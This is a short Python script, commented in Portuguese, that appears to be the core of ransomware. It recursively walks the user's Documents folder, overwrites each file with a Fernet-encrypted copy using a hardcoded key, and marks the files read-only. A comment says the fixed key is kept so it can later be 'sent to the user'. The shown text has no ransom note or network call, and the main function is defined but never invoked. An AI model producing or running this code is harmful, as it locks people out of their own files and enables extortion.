import os  # Importa o módulo os para interagir com o sistema operacional
from cryptography.fernet import Fernet 



# Define a chave fixa
FIXED_KEY = 'yYdARKr1Xgo28CKfiY-r-z28f18ix7aSAi9R_ig9caI='

# Define permissões de edição para o arquivo
def allow_edit(file_path):
    os.chmod(file_path, 0o644)  # Permissões de leitura e escrita

# Define permissões de leitura para o arquivo
def set_read_only(file_path):
    os.chmod(file_path, 0o444)  

# Função para encriptar um arquivo
def encrypt_file(filename, key):

    fernet = Fernet(key);
    # Define permissões de edição
    allow_edit(filename)

    fernet = Fernet(key)  # Inicializa um objeto Fernet com a chave fornecida
    # Lê os dados do arquivo original, encripta os dados e escreve os dados encriptados de volta no arquivo
    with open(filename, "rb") as file:
        original_data = file.read()  
    encrypted_data = fernet.encrypt(original_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)  

    # Define permissões de leitura
    set_read_only(filename)

# Função para encriptar todos os arquivos na diretoria documents
def encrypt_documents_directory():
    key = FIXED_KEY  # Utiliza sempre a mesma chave para que depois seja possível envia-la para o user

    documents_directory = os.path.join(os.path.expanduser("~"), "Documents")  # Obtém o caminho para documents
    # Percorre recursivamente a diretoria
    for root, dirs, files in os.walk(documents_directory):
        for file in files:
            file_path = os.path.join(root, file)  # Obtém o caminho completo do arquivo
            encrypt_file(file_path, key)  # Encripta o arquivo
